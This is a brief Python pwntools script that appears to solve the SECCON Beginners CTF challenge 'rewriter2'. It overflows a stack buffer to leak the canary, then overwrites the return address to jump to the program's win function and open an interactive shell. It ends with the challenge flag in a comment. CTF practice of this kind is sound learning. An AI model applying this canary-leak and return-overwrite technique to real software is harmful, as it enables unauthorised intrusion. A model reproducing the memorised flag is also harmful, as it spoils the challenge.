from pwn import *

# p = process('./rewriter2')
p = remote('rewriter2.beginners.seccon.games', 9001)
e = ELF('./rewriter2')

context.terminal = 'bash'

payload = b'A' * 0x28
p.sendlineafter(b'? ', payload)
p.recvline()
canary = u64(p.recvline()[:-1].ljust(8, b'\x00')) << 8
log.info("canary: " + hex(canary))

payload = b'A' * 0x28
payload += p64(canary)*2
payload += p64(e.symbols['win']+5)
p.sendlineafter(b'? ', payload)
p.interactive()

# ctf4b{y0u_c4n_l34k_c4n4ry_v4lu3}
